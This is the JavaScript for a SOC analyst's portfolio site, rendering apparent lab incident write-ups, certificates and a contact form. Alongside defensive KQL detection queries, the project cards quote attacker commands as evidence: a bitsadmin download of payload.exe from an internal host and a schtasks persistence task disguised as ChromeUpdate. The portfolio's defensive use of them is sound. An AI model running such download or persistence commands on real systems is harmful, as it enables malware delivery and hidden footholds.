// ── DATA ──────────────────────────────────────────────────
const GITHUB_BASE = 'https://github.com/praisel-ekpenyong/Portfolio/blob/main';
const CONTACT_EMAIL = 'ekpenyongpraisel@gmail.com';
const FORMSPREE_FORM_ID = 'xbdvrpdp';

const PROJECTS = [
  {
    id: 1,
    incident_id: 'INC-2026-005',
    title: 'Phishing Email Triage with Endpoint Correlation',
    description:
      'User-reported invoice phish correlated with Outlook spawning PowerShell on WKSTN-042. SPF/DKIM/DMARC header analysis, staged delivery-vs-execution conclusions, and proportionate containment before credential theft.',
    image_url: '',
    live_url: `${GITHUB_BASE}/incidents/INC-2026-005-phishing-chain.md`,
    mitre: ['T1566.001', 'T1059.001'],
    snippet: `DeviceProcessEvents
| where InitiatingProcessFileName =~ "outlook.exe"
| where FileName =~ "powershell.exe"`,
  },
  {
    id: 2,
    incident_id: 'INC-2026-002',
    title: 'Password Spray & Successful Cloud Sign-in',
    description:
      'Sentinel detected 18 failed Entra sign-ins followed by one success for a valid finance user. Validated account context, checked post-auth abuse (mailbox rules, OAuth consent, MFA changes), revoked sessions, and escalated as account-takeover risk.',
    image_url: '',
    live_url: `${GITHUB_BASE}/incidents/INC-2026-002-entra-password-spray.md`,
    mitre: ['T1110.003', 'T1078'],
    snippet: `SigninLogs
| where ResultType in ("50126", "0")
| summarize fails = countif(ResultType != "0"),
    wins = countif(ResultType == "0") by IPAddress`,
  },
  {
    id: 3,
    incident_id: 'INC-2026-001',
    title: 'LOLBin Execution: BITS Download',
    description:
      'Wazuh and Defender flagged bitsadmin.exe downloading a payload to WKSTN-042. Validated by comparing parent process, destination, user context, and change records against a benign SCCM baseline. Contained to one host, escalated to Tier 2.',
    image_url: '',
    live_url: `${GITHUB_BASE}/incidents/INC-2026-001-bits-job-download.md`,
    mitre: ['T1197', 'T1105'],
    snippet: `bitsadmin /transfer debjob /download
  http://10.10.30.10:8888/file/download
  C:\\Users\\Public\\payload.exe`,
  },
  {
    id: 4,
    incident_id: 'INC-2026-003',
    title: 'Suspicious Scheduled Task Persistence',
    description:
      'Wazuh and Defender detected a scheduled task named ChromeUpdate executing PowerShell from a user-writable Temp path. Validated against legitimate SCCM baseline, confirmed local to WKSTN-042 via DC 4698 scope check, and ran a multi-vector persistence sweep.',
    image_url: '',
    live_url: `${GITHUB_BASE}/incidents/INC-2026-003-scheduled-task-persistence.md`,
    mitre: ['T1053.005', 'T1059.001'],
    snippet: `schtasks /Create /TN ChromeUpdate /TR
  "powershell.exe -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.ps1"`,
  },
  {
    id: 5,
    incident_id: 'INC-2026-004',
    title: 'False Positive & Detection Tuning — VPN',
    description:
      'Sentinel created a VPN brute-force alert after 47 failed OpenVPN attempts from a scanner source. Validated zero valid users, zero successes, and a matching CHG-8821 geo-block change ticket. Closed as FP and tuned the rule to require valid usernames.',
    image_url: '',
    live_url: `${GITHUB_BASE}/incidents/INC-2026-004-false-positive-vpn.md`,
    mitre: ['T1110.001'],
    snippet: `VPNLogs
| where Action == "AUTH_FAILED"
| summarize FailedAttempts = count() by SourceIP
| where FailedAttempts > 10`,
  },
  {
    id: 6,
    incident_id: 'INC-2026-006',
    title: 'RDP Lateral Movement & Network Sniffing',
    description:
      'Wazuh flagged an RDP port modification (3389→8443) and tcpdump.exe execution on WKSTN-099. Traced lateral movement from WKSTN-042 via compromised jsmith credentials, ran tshark PCAP forensics to confirm zero data exfiltration, and isolated both hosts.',
    image_url: '',
    live_url: `${GITHUB_BASE}/incidents/INC-2026-006-rdp-lateral-movement.md`,
    mitre: ['T1021.001', 'T1040', 'T1112'],
    snippet: `tshark -r capture.pcapng -Y "dns.flags.response == 0"
  -T fields -e dns.qry.name | sort | uniq -c`,
  },
];

const CERTIFICATES = [
  { id: 1, title: 'CompTIA Security+', issuer: 'CompTIA', date: '2024', verify_url: 'https://www.comptia.org/verify', image_url: '' },
  { id: 2, title: 'Microsoft SC-200 Security Operations Analyst', issuer: 'Microsoft', date: '2024', verify_url: 'https://learn.microsoft.com/credentials', image_url: '' },
  { id: 3, title: 'Google Cybersecurity Professional Certificate', issuer: 'Google / Coursera', date: '2024', verify_url: 'https://www.coursera.org/verify', image_url: '' },
];

const TECH_STACKS = [
  { id: 1,  name: 'Splunk Enterprise',  logo_url: 'assets/techstack/splunk-enterprise.png' },
  { id: 2,  name: 'Microsoft Sentinel', logo_url: 'assets/techstack/microsoft-sentinel.png', white_bg: true },
  { id: 3,  name: 'Microsoft Defender', logo_url: 'assets/techstack/defender-endpoint.svg' },
  { id: 4,  name: 'Entra ID',           logo_url: 'assets/techstack/entra-id.png' },
  { id: 5,  name: 'Wazuh',              logo_url: 'assets/techstack/wazuh.png' },
  { id: 6,  name: 'Sysmon',             logo_url: 'assets/techstack/sysmon.png' },
  { id: 7,  name: 'Active Directory',   logo_url: 'assets/techstack/active-directory.png' },
  { id: 8,  name: 'PowerShell',         logo_url: 'assets/techstack/powershell-logs.png' },
  { id: 9,  name: 'Wireshark',          logo_url: 'assets/techstack/wireshark.png' },
  { id: 10, name: 'pfSense',            logo_url: 'assets/techstack/pfsense.svg' },
  { id: 11, name: 'VirusTotal',         logo_url: 'assets/techstack/virustotal.png' },
  { id: 12, name: 'Python',             logo_url: 'assets/techstack/python-automation.png' },
  { id: 13, name: 'Apache Caldera',     logo_url: 'assets/techstack/caldera.png' },
  { id: 14, name: 'osTicket',           logo_url: 'assets/techstack/osticket.png' },
];

const TYPEWRITER_PHRASES = [
  'Junior SOC Analyst',
  'Alert Triage',
  'SPL / KQL Detection',
  'Incident Investigation',
];

// ── WELCOME SCREEN ────────────────────────────────────────
const welcome = document.getElementById('welcome');
const navbar = document.getElementById('navbar');

function revealNavbar() {
  setTimeout(() => navbar.classList.add('visible'), 50);
}

setTimeout(() => {
  welcome.classList.add('hide');
  triggerHeroAnim();
}, 3200);
setTimeout(revealNavbar, 4200);

// ── HERO ANIMATION (GSAP card-drop) ───────────────────────
function triggerHeroAnim() {
  const heroPlayed = sessionStorage.getItem('heroPlayed');
  const delay = heroPlayed ? 0 : 800;
  setTimeout(() => {
    document.querySelectorAll('#h0,#h3,#h4,#h5,#h6').forEach(el => el.classList.add('show'));
    document.getElementById('h1').classList.add('show');
    document.getElementById('h2').classList.add('show');
    if (!heroPlayed) sessionStorage.setItem('heroPlayed', 'true');

    const card = document.getElementById('card-visual');
    if (card && window.gsap) {
      window.gsap.to(card, {
        y: 0,
        duration: 1.0,
        ease: 'power2.in',
        onComplete() {
          window.gsap.fromTo(
            card,
            { rotation: 18 },
            {
              rotation: 0,
              duration: 2.2,
              ease: 'elastic.out(1, 0.35)',
              transformOrigin: 'top center',
            }
          );
        },
      });
    }
  }, delay);
}

// ── TYPEWRITER ────────────────────────────────────────────
let phraseIdx = 0, charIdx = 0, deleting = false;
const tw = document.getElementById('typewriter-text');

function typeLoop() {
  const phrase = TYPEWRITER_PHRASES[phraseIdx];
  if (!deleting) {
    tw.textContent = phrase.substring(0, charIdx + 1);
    charIdx++;
    if (charIdx === phrase.length) { deleting = true; setTimeout(typeLoop, 1500); return; }
    setTimeout(typeLoop, 75);
  } else {
    tw.textContent = phrase.substring(0, charIdx - 1);
    charIdx--;
    if (charIdx === 0) { deleting = false; phraseIdx = (phraseIdx + 1) % TYPEWRITER_PHRASES.length; setTimeout(typeLoop, 300); return; }
    setTimeout(typeLoop, 50);
  }
}
setTimeout(typeLoop, 4200);

// ── SMOOTH SCROLL ─────────────────────────────────────────
function smoothScrollTo(target) {
  const el = document.querySelector(target);
  if (!el) return;
  const start = window.scrollY;
  const end = el.getBoundingClientRect().top + window.scrollY - 3;
  const dist = end - start;
  const dur = 1200;
  let t0 = null;
  function ease(t) { return t < .5 ? 4*t*t*t : 1 - Math.pow(-2*t+2,3)/2; }
  function step(now) {
    if (!t0) t0 = now;
    const prog = Math.min((now - t0) / dur, 1);
    window.scrollTo({ top: start + dist * ease(prog) });
    if (prog < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}

document.querySelectorAll('a[data-section]').forEach(a => {
  a.addEventListener('click', e => {
    e.preventDefault();
    smoothScrollTo('#' + a.dataset.section);
    document.getElementById('mobile-menu').classList.remove('open');
  });
});

document.getElementById('hamburger').addEventListener('click', () => {
  document.getElementById('mobile-menu').classList.toggle('open');
});

// ── NAVBAR SCROLL SPY ─────────────────────────────────────
const sections = ['home','about','portfolio','contact'];
function updateNav() {
  const scrolled = window.scrollY > 20;
  navbar.classList.toggle('scrolled', scrolled);
  for (const id of sections) {
    const el = document.getElementById(id);
    if (!el) continue;
    const r = el.getBoundingClientRect();
    if (r.top <= 140 && r.bottom >= 140) {
      document.querySelectorAll('[data-section]').forEach(a => {
        a.classList.toggle('active', a.dataset.section === id);
      });
      break;
    }
  }
}
window.addEventListener('scroll', updateNav, { passive: true });

// ── SCROLL REVEAL ─────────────────────────────────────────
const io = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      e.target.classList.add('in');
      io.unobserve(e.target);
    }
  });
}, { threshold: 0.05, rootMargin: '0px 0px -10% 0px' });
document.querySelectorAll('.reveal, .reveal-left').forEach(el => io.observe(el));

const fallbackReveal = () => {
  document.querySelectorAll('.reveal:not(.in), .reveal-left:not(.in)').forEach(el => {
    const r = el.getBoundingClientRect();
    if (r.bottom < window.innerHeight * 0.9 || r.top < window.innerHeight * 0.9) {
      el.classList.add('in');
    }
  });
};
window.addEventListener('scroll', fallbackReveal, { passive: true });
setTimeout(fallbackReveal, 100);
setTimeout(fallbackReveal, 1000);

// ── BLOB PARALLAX ─────────────────────────────────────────
const blobs = [0,1,2,3].map(i => document.getElementById('blob'+i));
window.addEventListener('scroll', () => {
  const s = window.pageYOffset;
  blobs.forEach((b, i) => {
    if (!b) return;
    const x = Math.sin(s/120 + i*.6) * 100;
    const y = Math.cos(s/120 + i*.6) * 35;
    b.style.transform = `translate(${x}px,${y}px)`;
  });
}, { passive: true });

// ── TABS ──────────────────────────────────────────────────
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
  });
});

// ── RENDER PROJECTS ───────────────────────────────────────
let showAll = false;
function renderProjects() {
  const grid = document.getElementById('projects-grid');
  const list = showAll ? PROJECTS : PROJECTS.slice(0, 3);
  grid.innerHTML = list.map((p, i) => `
    <div class="project-card" style="animation-delay:${i*.06}s">
      <div class="project-mitre">
        ${p.mitre.map(t => `<span class="mitre-tag">${t}</span>`).join('')}
      </div>
      <div class="project-title">${p.title}</div>
      <div class="project-desc">${p.description}</div>
      ${p.snippet ? `<pre class="project-snippet"><code>${p.snippet}</code></pre>` : ''}
      <div class="project-footer">
        ${p.live_url
          ? `<a href="${p.live_url}" target="_blank" rel="noopener noreferrer" class="project-live">View Write-up <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></a>`
          : `<span style="font-size:13px;color:var(--text-muted)">No Write-up</span>`}
        <span class="project-id-badge">${p.incident_id}</span>
      </div>
    </div>
  `).join('');

  const wrap = document.getElementById('see-more-wrap');
  wrap.style.display = PROJECTS.length > 3 ? 'flex' : 'none';
  document.getElementById('see-more-label').textContent = showAll ? 'See Less' : 'See More';
  const seeMoreIcon = document.querySelector('#see-more-icon polyline');
  if (seeMoreIcon) {
    seeMoreIcon.setAttribute('points', showAll ? '18 15 12 9 6 15' : '6 9 12 15 18 9');
  }
}
function toggleProjects() { showAll = !showAll; renderProjects(); }
renderProjects();

// ── STATS ─────────────────────────────────────────────────
document.getElementById('stat-projects').textContent = PROJECTS.length;
document.getElementById('stat-certs').textContent = CERTIFICATES.length;

// ── RENDER CERTIFICATES ───────────────────────────────────
document.getElementById('cert-grid').innerHTML = CERTIFICATES.map((c, i) => `
  <div class="cert-card" style="animation-delay:${i*.06}s">
    <div class="cert-img">
      <div class="cert-placeholder">
        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--text-secondary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="6"></circle><path d="M15.477 12.89L17 22l-5-3-5 3 1.523-9.11"></path></svg>
        <div class="cert-issuer">${c.issuer}</div>
        <div class="cert-date">${c.date || ''}</div>
      </div>
    </div>
    <div class="cert-title">${c.title}</div>
    ${c.verify_url ? `<a href="${c.verify_url}" target="_blank" rel="noopener noreferrer" class="cert-verify">Verify <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></a>` : ''}
  </div>
`).join('');

// ── RENDER TECH STACK ─────────────────────────────────────
document.getElementById('tech-grid').innerHTML = TECH_STACKS.map((t, i) => `
  <div class="tech-card" style="animation-delay:${i*.04}s">
    <div class="tech-glow"></div>
    <img src="${t.logo_url}" alt="${t.name}" onerror="this.style.display='none'" ${t.white_bg ? 'style="background:white;border-radius:4px;padding:2px;"' : ''} />
    <p>${t.name}</p>
  </div>
`).join('');

// ── IMAGE PREVIEW ─────────────────────────────────────────
function openPreview(url) {
  if (!url) return;
  document.getElementById('preview-img').src = url;
  document.getElementById('img-preview').classList.add('open');
}
document.getElementById('preview-close').addEventListener('click', () => {
  document.getElementById('img-preview').classList.remove('open');
});
document.getElementById('img-preview').addEventListener('click', e => {
  if (e.target === e.currentTarget) e.currentTarget.classList.remove('open');
});

// ── CONTACT FORM ──────────────────────────────────────────
function clearFieldError(wrapId) {
  document.getElementById(wrapId).classList.remove('has-error');
}

function sendMessage() {
  const name = document.getElementById('cf-name').value.trim();
  const email = document.getElementById('cf-email').value.trim();
  const msg = document.getElementById('cf-message').value.trim();

  let valid = true;

  if (!name) {
    document.getElementById('wrap-name').classList.add('has-error');
    valid = false;
  }
  if (!email) {
    const e = document.getElementById('email-error');
    if (e) e.textContent = 'Please enter your email.';
    document.getElementById('wrap-email').classList.add('has-error');
    valid = false;
  } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    const e = document.getElementById('email-error');
    if (e) e.textContent = 'Please enter a valid email address.';
    document.getElementById('wrap-email').classList.add('has-error');
    valid = false;
  }
  if (!msg) {
    document.getElementById('wrap-message').classList.add('has-error');
    valid = false;
  }

  if (!valid) return;

  const btn = document.querySelector('.btn-send');
  const statusDiv = document.getElementById('form-status');
  
  // Set loading state
  btn.disabled = true;
  const originalBtnHTML = btn.innerHTML;
  btn.innerHTML = `<span class="spinner"></span> Sending...`;
  
  if (statusDiv) {
    statusDiv.style.display = 'none';
    statusDiv.className = 'form-status';
    statusDiv.textContent = '';
  }

  // Submit via fetch to Formspree
  fetch(`https://formspree.io/f/${FORMSPREE_FORM_ID}`, {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      name: name,
      email: email,
      message: msg
    })
  })
  .then(response => {
    if (response.ok) {
      if (statusDiv) {
        statusDiv.textContent = 'Thank you! Your message has been sent successfully.';
        statusDiv.className = 'form-status success';
      }
      document.getElementById('cf-name').value = '';
      document.getElementById('cf-email').value = '';
      document.getElementById('cf-message').value = '';
    } else {
      return response.json().then(data => {
        if (data && data.errors) {
          throw new Error(data.errors.map(err => err.message).join(', '));
        } else {
          throw new Error('Failed to send message. Please try again.');
        }
      });
    }
  })
  .catch(error => {
    console.error('Formspree error:', error);
    if (statusDiv) {
      statusDiv.textContent = 'Submission failed. Falling back to email client...';
      statusDiv.className = 'form-status error';
    }
    
    // Fallback to mailto
    setTimeout(() => {
      const subject = encodeURIComponent(`Portfolio message from ${name}`);
      const body = encodeURIComponent(`Name: ${name}\nEmail: ${email}\n\nMessage:\n${msg}`);
      window.location.href = `mailto:${CONTACT_EMAIL}?subject=${subject}&body=${body}`;
    }, 1500);
  })
  .finally(() => {
    btn.disabled = false;
    btn.innerHTML = originalBtnHTML;
  });
}